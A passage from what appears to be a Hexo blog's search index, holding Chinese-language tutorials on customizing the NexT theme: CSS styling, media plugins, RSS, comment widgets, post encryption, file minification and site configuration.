rgba(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>,<span class="number">0.8</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//菜单栏的透明度设置</span></span><br><span class="line"><span class="selector-class">.header-inner</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: rgba(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>,<span class="number">0.3</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//搜索框（local-search）的透明度设置</span></span><br><span class="line"><span class="selector-class">.popup</span> &#123;</span><br><span class="line">  <span class="attribute">opacity</span>: <span class="number">0.85</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><a href="https://www.wolfdan.cn/Hexo-Next-Gemini%E4%B8%BB%E9%A2%98%E9%80%8F%E6%98%8E%E5%8C%96%E4%BB%A5%E5%8F%8A%E8%83%8C%E6%99%AF%E5%9B%BE%E7%89%87%E7%9A%84%E6%9B%B4%E6%94%B9/">透明设置另外版,代码块不太美观</a></p>
<p>解决按钮透明度: <code>themes\next\source\css\_common\components\post\post-button.styl</code> 同上修改对应位置为 <code>background: transparent;</code></p>
<h3 id="字体颜色"><a href="#字体颜色" class="headerlink" title="字体颜色"></a>字体颜色</h3><p>在自定义样式文件 <code>source/_data/styles.styl</code> 中添加定义</p>
<figure class="highlight styl"><table><tr><td class="code"><pre><span class="line"><span class="comment">//博客标题字体色</span></span><br><span class="line"><span class="selector-class">.site-title</span> &#123;</span><br><span class="line">	<span class="attribute">color</span>: <span class="number">#00BFFF</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//菜单字体色</span></span><br><span class="line"><span class="selector-class">.menu</span> <span class="selector-class">.menu-item</span> <span class="selector-tag">a</span> &#123;</span><br><span class="line">	<span class="attribute">color</span>: <span class="number">#8B1A1A</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//底部字体色</span></span><br><span class="line"><span class="selector-class">.footer-inner</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#EE00EE</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="配置链接文本样式"><a href="#配置链接文本样式" class="headerlink" title="配置链接文本样式"></a>配置链接文本样式</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim <span class="built_in">source</span>/_data/styles.styl	<span class="comment">#添加自定义样式</span></span><br></pre></td></tr></table></figure>
<figure class="highlight styl"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.post-body</span> <span class="selector-tag">p</span> <span class="selector-tag">a</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#0593d3</span>;</span><br><span class="line">  <span class="attribute">border-bottom</span>: none;</span><br><span class="line">  <span class="attribute">border-bottom</span>: <span class="number">1px</span> solid <span class="number">#0593d3</span>;</span><br><span class="line">  &amp;:hover &#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#fc6423</span>;</span><br><span class="line">    <span class="attribute">border-bottom</span>: none;</span><br><span class="line">    <span class="attribute">border-bottom</span>: <span class="number">1px</span> solid <span class="number">#fc6423</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h1><h2 id="文章模板"><a href="#文章模板" class="headerlink" title="文章模板"></a>文章模板</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim scaffolds/post.md</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: &#123;&#123; title &#125;&#125;</span><br><span class="line">date: &#123;&#123; date &#125;&#125;</span><br><span class="line">tags: [标签1,标签2,...]</span><br><span class="line">categories: [1级分类,2级分类,...]</span><br><span class="line">---</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!-- more --&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="文章内容中的影音"><a href="#文章内容中的影音" class="headerlink" title="文章内容中的影音"></a>文章内容中的影音</h2><h3 id="音乐"><a href="#音乐" class="headerlink" title="音乐"></a>音乐</h3><p><strong>直接使用HTML标签</strong>:<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">src</span>=<span class="string">&quot;https://音乐链接.mp3&quot;</span> <span class="attr">style</span>=<span class="string">&quot;max-height :100%; max-width: 100%; display: block; margin-left: auto; margin-right: auto;&quot;</span> <span class="attr">controls</span>=<span class="string">&quot;controls&quot;</span> <span class="attr">loop</span>=<span class="string">&quot;loop&quot;</span> <span class="attr">preload</span>=<span class="string">&quot;meta&quot;</span>&gt;</span>Your browser does not support the audio tag.<span class="tag">&lt;/<span class="name">audio</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<p><strong>使用插件(<code>hexo-tag-aplayer</code>),有显示歌词功能，也美观</strong><br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">yarn add hexo-tag-aplayer</span><br></pre></td></tr></table></figure></p>
<p>然后在文章中使用:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% aplayer &quot;歌曲名&quot; &quot;歌手名&quot; &quot;https:&#x2F;&#x2F;音乐链接.mp3&quot; &quot;https:&#x2F;&#x2F;封面图.jpg&quot; &quot;lrc:https:&#x2F;&#x2F;歌词.lrc&quot; %&#125;</span><br></pre></td></tr></table></figure>
<p>支持歌单:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% aplayerlist %&#125;</span><br><span class="line">&#123;</span><br><span class="line">    &quot;autoplay&quot;: false,</span><br><span class="line">    &quot;showlrc&quot;: 3,</span><br><span class="line">    &quot;mutex&quot;: true,</span><br><span class="line">    &quot;music&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;title&quot;: &quot;歌曲名&quot;,</span><br><span class="line">            &quot;author&quot;: &quot;歌手名&quot;,</span><br><span class="line">            &quot;url&quot;: &quot;https:&#x2F;&#x2F;音乐链接.mp3&quot;,</span><br><span class="line">            &quot;pic&quot;: &quot;https:&#x2F;&#x2F;封面图.jpg&quot;,</span><br><span class="line">            &quot;lrc&quot;: &quot;https:&#x2F;&#x2F;歌词.lrc&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;title&quot;: &quot;歌曲名&quot;,</span><br><span class="line">            &quot;author&quot;: &quot;歌手名&quot;,</span><br><span class="line">            &quot;url&quot;: &quot;https:&#x2F;&#x2F;音乐链接.mp3&quot;,</span><br><span class="line">            &quot;pic&quot;: &quot;https:&#x2F;&#x2F;封面图.jpg&quot;,</span><br><span class="line">            &quot;lrc&quot;: &quot;https:&#x2F;&#x2F;歌词.lrc&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br><span class="line">&#123;% endaplayerlist %&#125;</span><br></pre></td></tr></table></figure>
<p><a href="https://github.com/MoePlayer/hexo-tag-aplayer">hexo-tag-aplayer</a></p>
<h3 id="视频"><a href="#视频" class="headerlink" title="视频"></a>视频</h3><p><strong>直接使用HTML标签</strong>:<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">poster</span>=<span class="string">&quot;https://封面图.jpg&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://视频链接.mp4&quot;</span> <span class="attr">style</span>=<span class="string">&quot;max-height :100%; max-width: 100%; display: block; margin-left: auto; margin-right: auto;&quot;</span> <span class="attr">controls</span>=<span class="string">&quot;controls&quot;</span> <span class="attr">loop</span>=<span class="string">&quot;loop&quot;</span> <span class="attr">preload</span>=<span class="string">&quot;meta&quot;</span>&gt;</span>Your browser does not support the video tag.<span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><strong>用插件(<code>hexo-tag-dplayer</code>)，可支持弹幕</strong>:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">yarn add hexo-tag-dplayer</span><br></pre></td></tr></table></figure>
<p>然后在文章中使用:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% dplayer &quot;url&#x3D;https:&#x2F;&#x2F;视频链接.mp4&quot; &quot;https:&#x2F;&#x2F;封面图.jpg&quot; &quot;api&#x3D;https:&#x2F;&#x2F;api.prprpr.me&#x2F;dplayer&#x2F;&quot; &quot;id&#x3D;&quot; &quot;loop&#x3D;false&quot; %&#125;</span><br></pre></td></tr></table></figure>
<p>使用弹幕必须有 <code>api</code> 和 <code>id</code> 两项，并且若使用的是 <a href="https://github.com/MoePlayer/hexo-tag-dplayer">官方</a> 的 <code>api</code> 地址（即上面的），<code>id</code> 的值需要随机自定义，可用 <a href="https://tool.oschina.net/encrypt?type=2">工具</a> 将与众不同的文字😂生成哈希值来使用。</p>
<p><a href="https://github.com/MoePlayer/hexo-tag-dplayer">hexo-tag-dplayer</a></p>
<h2 id="配置RSS"><a href="#配置RSS" class="headerlink" title="配置RSS"></a>配置RSS</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yarn add hexo-generator-feed	<span class="comment">#安装插件</span></span><br><span class="line">vim _config.yml		<span class="comment">#修改博客配置文件</span></span><br></pre></td></tr></table></figure>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 添加RSS订阅配置内容</span></span><br><span class="line"><span class="attr">feed:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">atom</span></span><br><span class="line">  <span class="attr">path:</span> <span class="string">atom.xml</span></span><br><span class="line">  <span class="attr">limit:</span> <span class="number">20</span></span><br><span class="line">  <span class="attr">hub:</span></span><br><span class="line">  <span class="attr">content:</span></span><br><span class="line">  <span class="attr">content_limit:</span> <span class="number">140</span></span><br><span class="line">  <span class="attr">content_limit_delim:</span> <span class="string">&#x27; &#x27;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim _config.next.yml	<span class="comment">#修改主题配置文件</span></span><br></pre></td></tr></table></figure>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="string">rss:/atom.xml</span></span><br></pre></td></tr></table></figure>
<h2 id="配置评论系统"><a href="#配置评论系统" class="headerlink" title="配置评论系统"></a>配置评论系统</h2><p>到来必力注册登录，安装免费版填入相关信息后获得一串代码，在代码中有一串<code>uid</code>，将<code>uid值</code>复制出出来添加到主题配置文件中即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!-- 来必力City版安装代码 --&gt;</span><br><span class="line">&lt;div id&#x3D;&quot;lv-container&quot; data-id&#x3D;&quot;city&quot; data-uid&#x3D;&quot;MTAyMC80NTMxNS8yMTgyOA&#x3D;&#x3D;&quot;&gt;</span><br><span class="line">	&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">   (function(d, s) &#123;</span><br><span class="line">       var j, e &#x3D; d.getElementsByTagName(s)[0];</span><br><span class="line"></span><br><span class="line">       if (typeof LivereTower &#x3D;&#x3D;&#x3D; &#39;function&#39;) &#123; return; &#125;</span><br><span class="line"></span><br><span class="line">       j &#x3D; d.createElement(s);</span><br><span class="line">       j.src &#x3D; &#39;https:&#x2F;&#x2F;cdn-city.livere.com&#x2F;js&#x2F;embed.dist.js&#39;;</span><br><span class="line">       j.async &#x3D; true;</span><br><span class="line"></span><br><span class="line">       e.parentNode.insertBefore(j, e);</span><br><span class="line">   &#125;)(document, &#39;script&#39;);</span><br><span class="line">	&lt;&#x2F;script&gt;</span><br><span class="line">&lt;noscript&gt; 为正常使用来必力评论功能请激活JavaScript&lt;&#x2F;noscript&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&lt;!-- City版安装代码已完成 --&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim _config.next.yml	<span class="comment">#修改主题配置文件</span></span><br></pre></td></tr></table></figure>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment">#找到LiveRe comments system</span></span><br><span class="line"><span class="comment"># LiveRe comments system</span></span><br><span class="line"><span class="comment"># You can get your uid from https://livere.com/insight/myCode (General web site)</span></span><br><span class="line"><span class="attr">livere_uid:</span> <span class="string">MTAyMC80NTMxNS8yMTgyOA==</span></span><br></pre></td></tr></table></figure>
<h2 id="文章加密"><a href="#文章加密" class="headerlink" title="文章加密"></a>文章加密</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yarn add hexo-blog-encrypt	<span class="comment">#安装插件</span></span><br><span class="line">vim _config.yml		<span class="comment">#配置博客配置文件，文件内没有就自行添加</span></span><br></pre></td></tr></table></figure>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Security</span></span><br><span class="line"><span class="comment">##</span></span><br><span class="line"><span class="attr">encrypt:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<p>给文章加密</p>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: 文章标题</span><br><span class="line">date: 2016-03-30 21:18:02</span><br><span class="line">password: 123456  #密码</span><br><span class="line">abstract: 有东西被加密了, 请输入密码查看.</span><br><span class="line">message: 您好, 这里需要密码.</span><br><span class="line">wrong<span class="emphasis">_pass_</span>message: 抱歉, 这个密码看着不太对, 请再试试.</span><br><span class="line">wrong<span class="emphasis">_hash_</span>message: 抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
<h2 id="腾讯公益404页面"><a href="#腾讯公益404页面" class="headerlink" title="腾讯公益404页面"></a>腾讯公益404页面</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim <span class="built_in">source</span>/404.html	<span class="comment">#添加代码</span></span><br></pre></td></tr></table></figure>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh-cn&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>404<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;//qzonestyle.gtimg.cn/qzone/hybrid/app/404/search_children.js&quot;</span> <span class="attr">homePageName</span>=<span class="string">&quot;返回宝贝回家&quot;</span> <span class="attr">homePageUrl</span>=<span class="string">&quot;http://www.baobeihuijia.com&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="压缩静态文件提高访问速度"><a href="#压缩静态文件提高访问速度" class="headerlink" title="压缩静态文件提高访问速度"></a>压缩静态文件提高访问速度</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yarn add hexo-neat	<span class="comment">#安装插件</span></span><br><span class="line">vim _config.yml		<span class="comment">#添加配置信息</span></span><br></pre></td></tr></table></figure>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment">#静态文件压缩</span></span><br><span class="line"><span class="comment"># hexo-neat</span></span><br><span class="line"></span><br><span class="line"><span class="attr">neat_enable:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#压缩html</span></span><br><span class="line"><span class="attr">neat_html:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment">#跳过压缩</span></span><br><span class="line">  <span class="attr">exclude:</span></span><br><span class="line"><span class="comment">#压缩html时不要跳过.md文件和.swig文件（模块引擎文件）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#压缩css</span></span><br><span class="line"><span class="attr">neat_css:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">exclude:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&#x27;**/*.min.css&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#压缩js</span></span><br><span class="line"><span class="attr">neat_js:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">mangle:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">output:</span></span><br><span class="line">  <span class="attr">compress:</span></span><br><span class="line">  <span class="attr">exclude:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&#x27;**/*.min.js&#x27;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&#x27;**/index.js&#x27;</span></span><br></pre></td></tr></table></figure>
<h2 id="Hexo-admin"><a href="#Hexo-admin" class="headerlink" title="Hexo-admin"></a>Hexo-admin</h2><p>可视化界面操作文章</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yarn add hexo-admin</span><br></pre></td></tr></table></figure>
<p>访问<code>localhost:4000/admin/</code>, <code>Settings &gt; Setup authentification</code> 输入相关信息得到配置内容添加到<code>_config.yml</code> 进行配置</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># hexo-admin authentification</span></span><br><span class="line"><span class="attr">admin:</span></span><br><span class="line">  <span class="attr">username:</span> <span class="string">eonun</span></span><br><span class="line">  <span class="attr">password_hash:</span> <span class="string">$2a$10$8r2</span> <span class="comment"># 通过 bcrypt hash 加密生成的哈希值</span></span><br><span class="line">  <span class="attr">secret:</span> <span class="string">NCAIOfsiuhr293(*Y(I^#23hafkhasdf</span>  <span class="comment"># 加密cookies使用越长越复杂最好</span></span><br></pre></td></tr></table></figure>
<p><a href="https://github.com/jaredly/hexo-admin">hexo-admin</a></p>
<p><a href="https://hexo.io/plugins/">hexo 插件</a></p>
]]></content>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo主题美化</title>
    <url>/2019/07/14/Hexo%E4%B8%BB%E9%A2%98%E7%BE%8E%E5%8C%96/</url>
    <content><![CDATA[<h1 id="Hexo-next-v7主题配置美化"><a href="#Hexo-next-v7主题配置美化" class="headerlink" title="Hexo next v7主题配置美化"></a>Hexo next v7主题配置美化</h1><p> <strong>在博客根目录下操作</strong></p>
<h2 id="下载使用next主题"><a href="#下载使用next主题" class="headerlink" title="下载使用next主题"></a>下载使用next主题</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/theme-next/hexo-theme-next themes/next</span><br><span class="line">vim _config.yml		<span class="comment">#修改配置使用主题</span></span><br></pre></td></tr></table></figure>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="string">theme:next</span></span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h2 id="博客配置文件基础配置"><a href="#博客配置文件基础配置" class="headerlink" title="博客配置文件基础配置"></a>博客配置文件基础配置</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim _config</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Site</span><br><span class="line">title: 木He寸&amp;eonun&#39;s Blog			#标题</span><br><span class="line">subtitle: 记录积累方有成长		#副标题</span><br><span class="line">description: 你只需努力，其他任由天意！	#描述</span><br><span class="line">keywords:</span><br><span class="line">author: 木He寸&amp;eonun		#作者</span><br><span class="line">language: zh-CN		 #语言</span><br><span class="line">timezone: Asia&#x2F;Shanghai		#时区</span><br><span class="line"></span><br><span class="line"># URL</span><br><span class="line">## If your site is put in a subdirectory, set url as &#39;http:&#x2F;&#x2F;yoursite.com&#x2F;child&#39; and root as &#39;&#x2F;child&#x2F;&#39;</span><br><span class="line">url: https:&#x2F;&#x2F;eonun.com		#域名</span><br><span class="line">root: &#x2F;  	#默认根路径，指向实际的source</span><br><span class="line">permalink: :year&#x2F;:month&#x2F;:day&#x2F;:title&#x2F;	#永久链接</span><br><span class="line">permalink_defaults:		#永久链接默认值</span><br><span class="line"></span><br><span class="line"># Directory</span><br><span class="line">source_dir: source	#来源目录</span><br><span class="line">public_dir: public	#公开目录</span><br><span class="line">tag_dir: tags	#标签目录</span><br><span class="line">archive_dir: archives	#档案目录</span><br><span class="line">category_dir: categories	#类别目录</span><br><span class="line">code_dir: downloads&#x2F;code	#代码目录</span><br><span class="line">i18n_dir: :lang		#国际化目录</span><br><span class="line">skip_render: README.md 	# 部署的时候不包含的文件</span><br><span class="line"></span><br><span class="line"># Writing</span><br><span class="line">new_post_name: :title.md 	#默认的新博文名称</span><br><span class="line">default_layout: post 	#默认布局</span><br><span class="line">titlecase: false #将标题转换为标题</span><br><span class="line">external_link: true #在新标签中打开外部链接</span><br><span class="line">filename_case: 0 #把博客名称改成小写&#x2F;大写（1,2）</span><br><span class="line">render_drafts: false #是否显示草稿</span><br><span class="line">post_asset_folder: false #是否启用资源文件夹（用来存放相对路径图片或文件）</span><br><span class="line">relative_link: false 	#把链接改为与根目录的相对位址</span><br><span class="line">future: true</span><br><span class="line">highlight:	#高亮</span><br><span class="line">  enable: true 	#是否开启代码高亮</span><br><span class="line">  line_number: true		#是否增加代码行号</span><br><span class="line">  auto_detect: true 	#自动判断代码语言</span><br><span class="line">  tab_replace:	#标签替换</span><br></pre></td></tr></table></figure>
<h2 id="next主题主配置文件基础配置"><a href="#next主题主配置文件基础配置" class="headerlink" title="next主题主配置文件基础配置"></a>next主题主配置文件基础配置</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim themes/next/_config.yml</span><br></pre></td></tr></table></figure>
<h3 id="主题样式配置"><a href="#主题样式配置" class="headerlink" title="主题样式配置"></a>主题样式配置</h3><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Schemes	#选择一个主题样式，去掉前面的注释，将不用的主题样式注释掉</span></span><br><span class="line"><span class="comment">#scheme: Muse</span></span><br><span class="line"><span class="comment">#scheme: Mist</span></span><br><span class="line"><span class="attr">scheme:</span> <span class="string">Pisces</span></span><br><span class="line"><span class="comment">#scheme: Gemini# Schemes	#选择一个主题样式，去掉前面的注释，将不用的主题样式注释掉#scheme: Muse#scheme: Mistscheme: Pisces#scheme: Gemini</span></span><br></pre></td></tr></table></figure>
<h3 id="菜单栏配置"><a href="#菜单栏配置" class="headerlink" title="菜单栏配置"></a>菜单栏配置</h3><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">menu:</span>	<span class="comment">#将需要的菜单取消注释即可，顺便换一下顺序</span></span><br><span class="line">  <span class="attr">home:</span> <span class="string">/</span> <span class="string">||</span> <span class="string">home</span>	<span class="comment">#首页</span></span><br><span class="line">  <span class="attr">archives:</span> <span class="string">/archives/</span> <span class="string">||</span> <span class="string">archive</span>	<span class="comment">#归档</span></span><br><span class="line">  <span class="attr">categories:</span> <span class="string">/categories/</span> <span class="string">||</span> <span class="string">th</span>	<span class="comment">#分类</span></span><br><span class="line">  <span class="attr">tags:</span> <span class="string">/tags/</span> <span class="string">||</span> <span class="string">tags</span>	<span class="comment">#标签</span></span><br><span class="line">  <span class="attr">about:</span> <span class="string">/about/</span> <span class="string">||</span> <span class="string">user</span>	<span class="comment">#关于</span></span><br><span class="line">  <span class="comment">#schedule: /schedule/ || calendar	#日程表</span></span><br><span class="line">  <span class="comment">#sitemap: /sitemap.xml || sitemap	#网站地图</span></span><br><span class="line">  <span class="comment">#commonweal: /404/ || heartbeat	#公益404</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">#关于格式</span></span><br><span class="line">  <span class="comment">#以 tags: /tags/ || tags 为例：</span></span><br><span class="line">  <span class="comment">#|| 之前的/tags/表示标题“标签”，关于标题的格式可以去themes/next/languages/zh-CN.yml中修改</span></span><br><span class="line">  <span class="comment">#||之后的archive表示图标，可到Font Awesome中查看修改，Next主题所有的图标都来自这里</span></span><br></pre></td></tr></table></figure>
<p><a href="https://link.jianshu.com/?t=http%3A%2F%2Ffontawesome.io%2Ficons%2F">Font Awesome</a></p>
<h3 id="添加模块"><a href="#添加模块" class="headerlink" title="添加模块"></a>添加模块</h3><ul>
<li><strong>分类模块</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo n page categories</span><br><span class="line">vim <span class="built_in">source</span>/categories/index.md	<span class="comment">#修改</span></span><br></pre></td></tr></table></figure>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: 分类</span><br><span class="line">date: 2019-07-19 13:04:16</span><br><span class="line">type: categories</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
<p>需要在把文章进行分类时只需在文章顶部标题下方添加<code>categories</code>字段，即可自动创建分类名并加入对应的分类中</p>
<p><em>栗子：</em></p>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line"><span class="section">#单个分类</span></span><br><span class="line">title: 这是文章标题</span><br><span class="line">categories: 分类名</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="section">#有子分类</span></span><br><span class="line">title: 这是文章标题</span><br><span class="line">categories: [1级分类,2级分类,3级分类,...]</span><br><span class="line"></span><br><span class="line"><span class="section">#或</span></span><br><span class="line">title: 这是文章标题</span><br><span class="line">categories: </span><br><span class="line"><span class="bullet">-</span> 1级分类</span><br><span class="line"><span class="bullet">-</span> 2级分类</span><br><span class="line"><span class="bullet">-</span> 3级分类</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>标签模块</strong></li>
</ul>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">hexo n page <span class="keyword">tags</span></span><br><span class="line"><span class="keyword">vim</span> <span class="keyword">source</span>/<span class="keyword">tags</span>/<span class="built_in">index</span>.md	#comment<span class="variable">s:false</span>是关闭评论</span><br></pre></td></tr></table></figure>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: 标签</span><br><span class="line">date: 2019-07-19 13:04:24</span><br><span class="line">type: tags</span><br><span class="line">comments:false</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
<p>需要在给文章添加时只需在文章顶部标题下方添加<code>tags</code>字段，即可自动创建标签名并归入对应的标签中</p>
<p><em>栗子：</em></p>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line">title: 这是文章标题</span><br><span class="line">tags: [标签1,标签2,...]</span><br><span class="line"></span><br><span class="line"><span class="section">#或</span></span><br><span class="line">title: 这是文章标题</span><br><span class="line">tags: </span><br><span class="line"><span class="bullet">-</span> 标签1</span><br><span class="line"><span class="bullet">-</span> 标签2</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>关于模块</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo n page about</span><br></pre></td></tr></table></figure>
<p><code>source</code>文件夹下会生成<code>about/index.md</code>，打开<code>index.md</code>文件即可编辑个人相关信息</p>
<ul>
<li><strong>本地搜索模块</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yarn add hexo-generator-searchdb	<span class="comment">#安装搜索插件</span></span><br><span class="line">vim _config.yml	<span class="comment">#修改博客配置文件</span></span><br></pre></td></tr></table></figure>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 在Extensions下添加搜索配置模块</span></span><br><span class="line"><span class="attr">search:</span></span><br><span class="line">  <span class="attr">path:</span> <span class="string">search.xml</span></span><br><span class="line">  <span class="attr">field:</span> <span class="string">post</span></span><br><span class="line">  <span class="attr">content:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">format:</span> <span class="string">html</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim themes/next/_config.yml	<span class="comment">#修改主题配置文件</span></span><br></pre></td></tr></table></figure>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Local search</span></span><br><span class="line"><span class="comment"># Dependencies: https://github.com/theme-next/hexo-generator-searchdb</span></span><br><span class="line"><span class="attr">local_search:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span>	<span class="comment">#开启搜索模块</span></span><br><span class="line">  </span><br><span class="line">  <span class="attr">trigger:</span> <span class="string">auto</span>	<span class="comment"># auto 通过输入触发， manual 通过回车键触发</span></span><br><span class="line">  </span><br><span class="line">  <span class="attr">top_n_per_article:</span> <span class="number">1</span>	<span class="comment">#设置显示每篇文章前n个结果， -1 为全部结果</span></span><br><span class="line">  </span><br><span class="line">  <span class="attr">unescape:</span> <span class="literal">false</span>	<span class="comment">#Unescape html字符串到可读的字符串</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>全文阅读</strong></li>
</ul>
<p>博客主页会有多篇文章，如果想让你的文章只显示一部分，多余内容需要点击阅读全文来查看，那么就需要在的文章中添加：</p>
